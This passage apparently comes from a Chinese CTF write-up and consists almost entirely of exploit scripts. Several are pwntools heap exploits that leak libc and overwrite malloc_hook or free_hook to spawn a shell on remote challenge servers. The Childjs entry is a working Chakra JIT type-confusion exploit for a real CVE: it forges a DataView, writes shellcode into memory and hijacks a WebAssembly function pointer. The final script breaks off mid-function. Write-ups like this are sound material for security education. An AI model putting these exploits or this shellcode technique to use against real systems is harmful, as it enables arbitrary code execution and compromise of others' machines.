add(<span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x20</span>) <span class="hljs-comment">#1</span>
libc=u64(show(<span class="hljs-number">2</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3ebca0</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc))


add(<span class="hljs-string">&quot;8&quot;</span>*<span class="hljs-number">0x20</span>)
delete(<span class="hljs-number">16</span>)
delete(<span class="hljs-number">18</span>)
heap=u64(show(<span class="hljs-number">2</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x310</span>
<span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(heap)
add(<span class="hljs-string">&quot;6&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;8&quot;</span>*<span class="hljs-number">0x20</span>)
feed(<span class="hljs-number">16</span>,<span class="hljs-number">0x18</span>)

edit(<span class="hljs-number">16</span>,<span class="hljs-string">&#x27;\x03\x00&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)
edit(<span class="hljs-number">16</span>,<span class="hljs-string">&#x27;\xa1\x41&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>)
fakechunk=[heap,heap+<span class="hljs-number">0x40</span>,heap+<span class="hljs-number">0x80</span>,heap+<span class="hljs-number">0xc0</span>+<span class="hljs-number">0xbb</span>,heap+<span class="hljs-number">0x100</span>,heap+<span class="hljs-number">0x140</span>,heap+<span class="hljs-number">0x180</span>]


<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
    <span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(fakechunk[i])
    delete(i+<span class="hljs-number">3</span>)
    add(<span class="hljs-built_in">str</span>((i+<span class="hljs-number">3</span>))*<span class="hljs-number">8</span>+p64(fakechunk[i]))
edit(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;\xbb\x00&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)

delete(<span class="hljs-number">10</span>)
add(<span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">8</span>+p64(base+<span class="hljs-number">0x203160</span>-<span class="hljs-number">0x10</span>))
add(<span class="hljs-string">&quot;&quot;</span>)

malloc_hook=libc+<span class="hljs-number">0x3ebc30</span>

delete(<span class="hljs-number">10</span>)
delete(<span class="hljs-number">11</span>)
delete(<span class="hljs-number">12</span>)
delete(<span class="hljs-number">13</span>)
delete(<span class="hljs-number">14</span>)

add(<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x20</span>)
add(<span class="hljs-string">&quot;2&quot;</span>*<span class="hljs-number">0x20</span>)


delete(<span class="hljs-number">16</span>)
delete(<span class="hljs-number">2</span>)

add(p64(malloc_hook))
add(p64(libc+<span class="hljs-number">0x10a38c</span>))
add(p64(libc+<span class="hljs-number">0x10a38c</span>))
ru(<span class="hljs-string">&quot;command&gt;&gt; &quot;</span>)
sl(<span class="hljs-number">1</span>)

ia()

</code></pre><h3 id="daybyday"><a class="header-link" href="#daybyday"></a>DAYBYDAY</h3>
<p>提示是feistel但轮函数是异或</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5
<span class="hljs-keyword">from</span> util <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> unhexlify <span class="hljs-keyword">as</span> unhex, hexlify <span class="hljs-keyword">as</span> enhex
<span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">crack</span>(<span class="hljs-params">prefix, dest</span>):</span>
    charz = <span class="hljs-string">&#x27;_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+&#x27;</span>
    <span class="hljs-keyword">for</span> c0 <span class="hljs-keyword">in</span> charz:
        <span class="hljs-keyword">for</span> c1 <span class="hljs-keyword">in</span> charz:
            <span class="hljs-keyword">for</span> c2 <span class="hljs-keyword">in</span> charz:
                chall = prefix + c0 + c1 + c2
                <span class="hljs-keyword">if</span> md5(chall).digest() == dest:
                    <span class="hljs-keyword">return</span> c0 + c1 + c2

p = pwn(<span class="hljs-string">&#x27;119.3.197.212:12345&#x27;</span>)
ru = p.recvuntil
rl = <span class="hljs-keyword">lambda</span>:p.recvuntil(<span class="hljs-string">&#x27;\r\n&#x27;</span>, <span class="hljs-literal">True</span>)
rn = p.recv
sl = p.sendline
sla = p.sendlineafter

ru(<span class="hljs-string">&#x27;IQ:#&#x27;</span>)
dest = ru(<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-literal">True</span>)
chall = ru(<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-literal">True</span>)
<span class="hljs-built_in">print</span>(dest, chall)
pwd = crack(chall, unhex(dest))
sl(pwd)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">menu</span>(<span class="hljs-params">i</span>):</span>
    sla(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-built_in">str</span>(i))

menu(<span class="hljs-number">1</span>) <span class="hljs-comment"># get cipher</span>
cipher1 = unhex(rl())
cipher2 = unhex(rl())
<span class="hljs-built_in">print</span>(enhex(cipher1), enhex(cipher2))

menu(<span class="hljs-number">3</span>) <span class="hljs-comment"># test</span>
sla(<span class="hljs-string">&#x27;L:&#x27;</span>, <span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">12</span>)
sla(<span class="hljs-string">&#x27;R:&#x27;</span>, <span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">12</span>)

menu(<span class="hljs-number">4</span>) <span class="hljs-comment"># dayslife</span>
sla(<span class="hljs-string">&#x27;size:&#x27;</span>, <span class="hljs-string">&#x27;35&#x27;</span>)
sla(<span class="hljs-string">&#x27;get it:&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">11</span>)
t = rn(<span class="hljs-number">35</span> * <span class="hljs-number">2</span>)
t = unhex(t[<span class="hljs-number">11</span> * <span class="hljs-number">2</span>:])
left = t[:<span class="hljs-number">12</span>]
right = t[<span class="hljs-number">12</span>:]

res = strxor(left + right, cipher1 + cipher2)
ans = md5(res).hexdigest()

menu(<span class="hljs-number">2</span>) <span class="hljs-comment"># get flag</span>
sla(<span class="hljs-string">&#x27;secret:&#x27;</span>, ans)

p.interactive()</code></pre><p><code>flag{feistel_with_pwn_is_stupid_1111}</code></p>
<h3 id="trywrite"><a class="header-link" href="#trywrite"></a>trywrite</h3>
<p>覆盖改写全局list，任意地址读写</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decipher</span>(<span class="hljs-params">v, k</span>):</span>
    y = c_uint32(v[<span class="hljs-number">0</span>])
    z = c_uint32(v[<span class="hljs-number">1</span>])
    sm = c_uint32(<span class="hljs-number">0x9e3779b9</span> * <span class="hljs-number">16</span>)
    delta = <span class="hljs-number">0x9e3779b9</span>
    n = <span class="hljs-number">16</span>
    w = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]

    <span class="hljs-keyword">while</span> (n &gt; <span class="hljs-number">0</span>):
        z.value -= (y.value &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">2</span>] ^ y.value + sm.value ^ (y.value &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">3</span>]
        y.value -= (z.value &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">0</span>] ^ z.value + sm.value ^ (z.value &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">1</span>]
        sm.value -= delta
        n -= <span class="hljs-number">1</span>

    w[<span class="hljs-number">0</span>] = y.value
    w[<span class="hljs-number">1</span>] = z.value
    <span class="hljs-keyword">return</span> w


debug = <span class="hljs-number">0</span>

e = ELF(<span class="hljs-string">&#x27;./trywrite.so&#x27;</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">data, key=<span class="hljs-string">&#x27;&#x27;</span></span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
    key = key.ljust(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)
    p.sendafter(<span class="hljs-string">&#x27;:&#x27;</span>, key)
    data = data.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)
    p.sendafter(<span class="hljs-string">&#x27;:&#x27;</span>, data)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">off1, off2, data</span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)
    p.sendlineafter(<span class="hljs-string">&#x27;heap:&#x27;</span>, <span class="hljs-built_in">str</span>(off1 &amp; <span class="hljs-number">0xffffffffffffffff</span>)[:<span class="hljs-number">15</span>])
    p.sendlineafter(<span class="hljs-string">&#x27;key:&#x27;</span>, <span class="hljs-built_in">str</span>(off2 &amp; <span class="hljs-number">0xffffffffffffffff</span>)[:<span class="hljs-number">15</span>])
    data = data.ljust(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)
    p.sendafter(<span class="hljs-string">&#x27;key:&#x27;</span>, data)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fucktea</span>(<span class="hljs-params">data, key=<span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span></span>):</span>
    k = []
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span>):
        k.append(u32(key[x:x + <span class="hljs-number">4</span>]))

    v = []
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">4</span>):
        v.append(u32(data[x:x + <span class="hljs-number">4</span>]))

    w = decipher(v, k)

    s = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> w:
        s += p32(x)
    <span class="hljs-keyword">return</span> s


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">ptr</span>):</span>
    update(<span class="hljs-number">0x50</span>, <span class="hljs-number">0</span>, p64(ptr - <span class="hljs-number">8</span>))
    gap = ptr - <span class="hljs-number">0x66600000</span> - <span class="hljs-number">8</span>
    update(gap, -gap, <span class="hljs-string">&#x27;&#x27;</span>)
    show(<span class="hljs-number">2</span>)
    p.recvline()
    c = fucktea(p.recv(<span class="hljs-number">0x80</span>))
    <span class="hljs-keyword">return</span> c


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">ptr, data</span>):</span>
    update(<span class="hljs-number">0x50</span>, <span class="hljs-number">0</span>, p64(ptr))
    gap = ptr - <span class="hljs-number">0x66600000</span>
    update(gap, -gap, data)


<span class="hljs-keyword">if</span> debug:
    p = process(<span class="hljs-string">&#x27;./trywrite&#x27;</span>, env={<span class="hljs-string">&#x27;LD_PRELOAD&#x27;</span>: <span class="hljs-string">&#x27;./trywrite.so&#x27;</span>})
<span class="hljs-keyword">else</span>:
    p = remote(<span class="hljs-string">&#x27;117.78.60.139&#x27;</span>, <span class="hljs-number">30365</span>)

p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x66600000</span>))
p.sendlineafter(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>)
p.sendline(<span class="hljs-string">&#x27;nonick&#x27;</span>)
add(<span class="hljs-string">&#x27;nonick0&#x27;</span>)
add(p64(<span class="hljs-number">0x91</span>))
add(<span class="hljs-string">&#x27;nonick2&#x27;</span>)

update(<span class="hljs-number">0x50</span>, <span class="hljs-number">0</span>, p64(<span class="hljs-number">0x66600050</span>) + p64(<span class="hljs-number">0x11223344</span>))
update(<span class="hljs-number">0x49</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;\x00\x60\x66&#x27;</span>.ljust(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + <span class="hljs-string">&#x27;\x49&#x27;</span>)

update(<span class="hljs-number">0x50</span>, <span class="hljs-number">0</span>, p64(<span class="hljs-number">0x666000b0</span>))

<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">8</span>):
    add(<span class="hljs-string">&#x27;{}&#x27;</span>.<span class="hljs-built_in">format</span>(x))

<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">7</span>):
    free(<span class="hljs-number">3</span> + x)
free(<span class="hljs-number">0</span>)

update(<span class="hljs-number">0xb0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;&#x27;</span>)
show(<span class="hljs-number">2</span>)

p.recvline()

encrypted = p.recv(<span class="hljs-number">8</span>)
libc = u64(fucktea(encrypted)) - <span class="hljs-number">0x3ebca0</span>

log.success(<span class="hljs-string">&#x27;libc:&#x27;</span> + <span class="hljs-built_in">hex</span>(libc))
update(<span class="hljs-number">0xb0</span>, <span class="hljs-number">0</span>, p64(libc))
update(<span class="hljs-number">0x50</span>, <span class="hljs-number">0</span>, p64(<span class="hljs-number">0x666000b8</span>))
update(<span class="hljs-number">0xb8</span>, <span class="hljs-number">0</span>, p64(libc) + p64(<span class="hljs-number">0xa0</span>))

<span class="hljs-keyword">if</span> debug:
    gdb.attach(p, <span class="hljs-string">&#x27;c &#x27;</span>)

e.address = libc

write(e.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>], p64(e.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]))
update(<span class="hljs-number">0x50</span>, <span class="hljs-number">0</span>, p64(<span class="hljs-built_in">next</span>(e.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))))

free(<span class="hljs-number">2</span>)

p.interactive()</code></pre><h3 id="childjs"><a class="header-link" href="#childjs"></a>Childjs</h3>
<p>chakra的真实cve，jit的洞导致类型混淆，利用object的属性存储方式不同完成利用。</p>
<pre class="hljs"><code>var fake_object = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)</span>;
var f64 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Float64Array(1)</span>;
var i32 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Int32Array(<span class="hljs-params">f64</span>.<span class="hljs-params">buffer</span>)</span>;
var array_addr_hi, array_addr_lo;
var dv;

var new_dv = <span class="hljs-keyword">new</span> <span class="hljs-constructor">DataView(<span class="hljs-params">new</span> ArrayBuffer(0x10)</span>);
address<span class="hljs-constructor">Of(<span class="hljs-params">new_dv</span>)</span>;

<span class="hljs-keyword">function</span> write32(addr_hi, addr_lo, value) {
    fake_object<span class="hljs-literal">[<span class="hljs-number">14</span>]</span> = u32<span class="hljs-constructor">_to_i32(<span class="hljs-params">addr_lo</span>)</span>;
    fake_object<span class="hljs-literal">[<span class="hljs-number">15</span>]</span> = u32<span class="hljs-constructor">_to_i32(<span class="hljs-params">addr_hi</span>)</span>;
    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DataView</span>.</span></span>prototype.setInt32.call(dv, <span class="hljs-number">0</span>, value, <span class="hljs-literal">true</span>);
}

<span class="hljs-keyword">function</span> read32(addr_hi, addr_lo) {
    fake_object<span class="hljs-literal">[<span class="hljs-number">14</span>]</span> = u32<span class="hljs-constructor">_to_i32(<span class="hljs-params">addr_lo</span>)</span>;
    fake_object<span class="hljs-literal">[<span class="hljs-number">15</span>]</span> = u32<span class="hljs-constructor">_to_i32(<span class="hljs-params">addr_hi</span>)</span>;
    return <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DataView</span>.</span></span>prototype.getInt32.call(dv, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);
}

<span class="hljs-keyword">function</span> read64(addr_hi, addr_low) {
    lower_dword  = read32(addr_hi, addr_low);
    higher_dword = read32(addr_hi, addr_low + <span class="hljs-number">4</span>);
    return {hi : higher_dword, lo : lower_dword };
}

<span class="hljs-keyword">function</span> print64(int64_value, message){
    print(message + &#x27;<span class="hljs-number">0</span>x&#x27;+ i32<span class="hljs-constructor">_to_u32(<span class="hljs-params">int64_value</span>.<span class="hljs-params">hi</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String(16)</span> + i32<span class="hljs-constructor">_to_u32(<span class="hljs-params">int64_value</span>.<span class="hljs-params">lo</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String(16)</span>);
}

<span class="hljs-comment">// Uint32 to Int32</span>
<span class="hljs-keyword">function</span> u32<span class="hljs-constructor">_to_i32(<span class="hljs-params">x</span>)</span> {
    <span class="hljs-keyword">if</span> (x &gt;= <span class="hljs-number">0x80000000</span>) {
        return -(<span class="hljs-number">0x100000000</span> - x);
    }
    return x;
}

<span class="hljs-comment">// Int32 to Uint32</span>
<span class="hljs-keyword">function</span> i32<span class="hljs-constructor">_to_u32(<span class="hljs-params">x</span>)</span> {
    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span>) {
        return <span class="hljs-number">0x100000000</span> + x;
    }
    return x;
}

<span class="hljs-keyword">let</span> wasm_code = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11])</span>;
<span class="hljs-keyword">let</span> wasm_mod = <span class="hljs-keyword">new</span> WebAssembly.<span class="hljs-constructor">Instance(<span class="hljs-params">new</span> WebAssembly.Module(<span class="hljs-params">wasm_code</span>)</span>, {});
<span class="hljs-keyword">let</span> f = wasm_mod.exports._Z3addii;

<span class="hljs-keyword">function</span> opt(o, s, value) {
    o.a2 = <span class="hljs-number">1</span>;

    <span class="hljs-keyword">if</span> (s !== null) {
        <span class="hljs-keyword">let</span> tmp = <span class="hljs-character">&#x27;a&#x27;</span>.locale<span class="hljs-constructor">Compare(<span class="hljs-params">s</span>)</span>;
    }

    o.a1 = value;
}

<span class="hljs-keyword">function</span> main<span class="hljs-literal">()</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2000</span>; i++) {
        <span class="hljs-character">&#x27;a&#x27;</span>.locale<span class="hljs-constructor">Compare(&#x27;<span class="hljs-params">x</span>&#x27;, [])</span>;  <span class="hljs-comment">// Optimize the JavaScript localeCompare</span>
        <span class="hljs-keyword">let</span> o = {a1:{},a2:<span class="hljs-number">2.2</span>,a3:<span class="hljs-number">3.3</span>,a4:<span class="hljs-number">4.4</span>};

        opt(o, null, {});  <span class="hljs-comment">// for profiling all instructions in opt.</span>

        <span class="hljs-keyword">let</span> o2 = {a1:{},a2:<span class="hljs-number">2.2</span>,a3:<span class="hljs-number">3.3</span>,a4:<span class="hljs-number">4.4</span>};
        <span class="hljs-keyword">try</span> {
            opt(o2, {toString:<span class="hljs-function"> <span class="hljs-params">()</span> =&gt;</span> {
                throw <span class="hljs-number">1</span>;  <span class="hljs-comment">// Don&#x27;t profile &quot;if (locales === undefined &amp;&amp; options === undefined) {&quot;</span>
            }}, {});
        } catch (e) {

        }
    }

    <span class="hljs-keyword">let</span> o = {a1:{},a2:<span class="hljs-number">2.2</span>,a3:<span class="hljs-number">3.3</span>,a4:<span class="hljs-number">4.4</span>};
    <span class="hljs-keyword">let</span> arr=<span class="hljs-literal">[<span class="hljs-number">1.1</span>,<span class="hljs-number">2.2</span>,<span class="hljs-number">3.3</span>]</span>; <span class="hljs-comment">//used to get the vtable pointer and type pointer</span>
    <span class="hljs-keyword">let</span> arr2=<span class="hljs-literal">[<span class="hljs-number">1.1</span>,<span class="hljs-identifier">fake_object</span>,<span class="hljs-identifier">f</span>]</span>;

    opt(o, {toString:<span class="hljs-function"> <span class="hljs-params">()</span> =&gt;</span> {
        o.c = <span class="hljs-number">123</span>;;
    }}, arr);
    <span class="hljs-keyword">let</span> native_float_arr_vtable=o.a3;
    <span class="hljs-keyword">let</span> native_float_arr_type = o.a4;

    <span class="hljs-keyword">let</span> o2 = {a1:{},a2:<span class="hljs-number">2.2</span>,a3:<span class="hljs-number">3.3</span>,a4:<span class="hljs-number">4.4</span>};
    opt(o2, {toString:<span class="hljs-function"> <span class="hljs-params">()</span> =&gt;</span> {
        o2.c = <span class="hljs-number">123</span>;;
    }}, arr2);

    <span class="hljs-keyword">let</span> var_array_vtable=o2.a3;
    <span class="hljs-keyword">let</span> var_array_type=o2.a4;
    <span class="hljs-comment">//transform a var array to native float array</span>
    o2.a3=native_float_arr_vtable;
    o2.a4=native_float_arr_type;

    f64<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>=arr2<span class="hljs-literal">[<span class="hljs-number">2</span>]</span>;

    var f_lo = i32<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>, f_hi = i32<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>;
    print64({hi:f_hi, lo:f_lo}, &#x27;<span class="hljs-literal">[<span class="hljs-operator">*</span>]</span> <span class="hljs-keyword">function</span> address:&#x27;);

    f64<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>=arr2<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>;
    var base_lo = i32<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>, base_hi = i32<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>;
    i32<span class="hljs-literal">[<span class="hljs-number">0</span>]</span> = base_lo + <span class="hljs-number">0x58</span>;
    print64({hi:i32<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>, lo:i32<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>}, &#x27;<span class="hljs-literal">[<span class="hljs-operator">*</span>]</span> fake_object address:&#x27;);
    arr2<span class="hljs-literal">[<span class="hljs-number">1</span>]</span> = f64<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>;

    <span class="hljs-comment">// Construct our fake DataView</span>
    <span class="hljs-comment">// vtable</span>
    fake_object<span class="hljs-literal">[<span class="hljs-number">0</span>]</span> = base_lo + <span class="hljs-number">0x58</span> - <span class="hljs-number">0xb0</span> + <span class="hljs-number">0x20</span>;  fake_object<span class="hljs-literal">[<span class="hljs-number">1</span>]</span> = base_hi;
    <span class="hljs-comment">// Type*</span>
    fake_object<span class="hljs-literal">[<span class="hljs-number">2</span>]</span> = base_lo + <span class="hljs-number">0x68</span>;         fake_object<span class="hljs-literal">[<span class="hljs-number">3</span>]</span> = base_hi;
    <span class="hljs-comment">// (TypeId for fake Type object)</span>
    fake_object<span class="hljs-literal">[<span class="hljs-number">4</span>]</span> = <span class="hljs-number">58</span>;                     fake_object<span class="hljs-literal">[<span class="hljs-number">5</span>]</span> = <span class="hljs-number">0</span>;
    <span class="hljs-comment">// (JavascriptLibrary* for fake Type object, +0x430 must be valid memory)</span>
    fake_object<span class="hljs-literal">[<span class="hljs-number">6</span>]</span> = base_lo + <span class="hljs-number">0x58</span> - <span class="hljs-number">0x430</span>; fake_object<span class="hljs-literal">[<span class="hljs-number">7</span>]</span> = base_hi;
    <span class="hljs-comment">// Buffer size</span>
    fake_object<span class="hljs-literal">[<span class="hljs-number">8</span>]</span> = <span class="hljs-number">0x200</span>;                  fake_object<span class="hljs-literal">[<span class="hljs-number">9</span>]</span> = <span class="hljs-number">0</span>;
    <span class="hljs-comment">// ArrayBuffer pointer, +0x3C IsDetached</span>
    fake_object<span class="hljs-literal">[<span class="hljs-number">10</span>]</span> = base_lo + <span class="hljs-number">0x58</span> - <span class="hljs-number">0x20</span> + <span class="hljs-number">20</span>; fake_object<span class="hljs-literal">[<span class="hljs-number">11</span>]</span> = base_hi;
    <span class="hljs-comment">// Buffer address</span>
    fake_object<span class="hljs-literal">[<span class="hljs-number">14</span>]</span> = base_lo + <span class="hljs-number">0x58</span>;        fake_object<span class="hljs-literal">[<span class="hljs-number">15</span>]</span> = base_hi;

    address<span class="hljs-constructor">Of(<span class="hljs-params">fake_object</span>)</span>;
    array_addr_hi = i32<span class="hljs-constructor">_to_u32(<span class="hljs-params">base_hi</span>)</span>;
    array_addr_lo = i32<span class="hljs-constructor">_to_u32(<span class="hljs-params">base_lo</span>)</span>;

    o2.a3=var_array_vtable;
    o2.a4=var_array_type;

    dv=arr2<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>;
    address<span class="hljs-constructor">Of(<span class="hljs-params">dv</span>)</span>;
    var f_leak_int64 = { hi :f_hi, lo : f_lo };
    print64(f_leak_int64, &#x27;<span class="hljs-literal">[<span class="hljs-operator">*</span>]</span> wasm obj address:&#x27;);
    pause<span class="hljs-literal">()</span>;

    var shellcode = <span class="hljs-literal">[<span class="hljs-number">0xbb48c031</span>, <span class="hljs-number">0x91969dd1</span>, <span class="hljs-number">0xff978cd0</span>, <span class="hljs-number">0x53dbf748</span>, <span class="hljs-number">0x52995f54</span>, <span class="hljs-number">0xb05e5457</span>, <span class="hljs-number">0x50f3b</span>]</span>;
    var start=array_addr_lo-<span class="hljs-number">0x100</span>;
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; shellcode.length; i++) {
        write32(array_addr_hi,start,shellcode<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>);
        start=start+<span class="hljs-number">4</span>;
    }

    var f_ptr = read64(f_hi, f_lo+<span class="hljs-number">0x8</span>);
    <span class="hljs-comment">//Modify its function pointer to the address of the shellcode</span>
    write32(f_ptr.hi,f_ptr.lo+<span class="hljs-number">0x18</span>,array_addr_lo-<span class="hljs-number">0x100</span>);
    write32(f_ptr.hi,f_ptr.lo+<span class="hljs-number">0x1c</span>,array_addr_hi);
    <span class="hljs-comment">//Get shell</span>
    f<span class="hljs-literal">()</span>;


}

main<span class="hljs-literal">()</span>;</code></pre><h3 id="babycpp"><a class="header-link" href="#babycpp"></a>babycpp</h3>
<p>abs(0x80000000)造成上溢出，type confuse之后任意地址读写</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> *

debug = <span class="hljs-number">0</span>

libc=ELF(<span class="hljs-string">&#x27;./babycpp.libc&#x27;</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params"><span class="hljs-built_in">type</span></span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;s&#x27;</span>:
        p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)
    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&#x27;i&#x27;</span>:
        p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
    <span class="hljs-keyword">else</span>:
        p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-built_in">hash</span>, idx</span>):</span>
    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)
    <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span>.ljust(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)
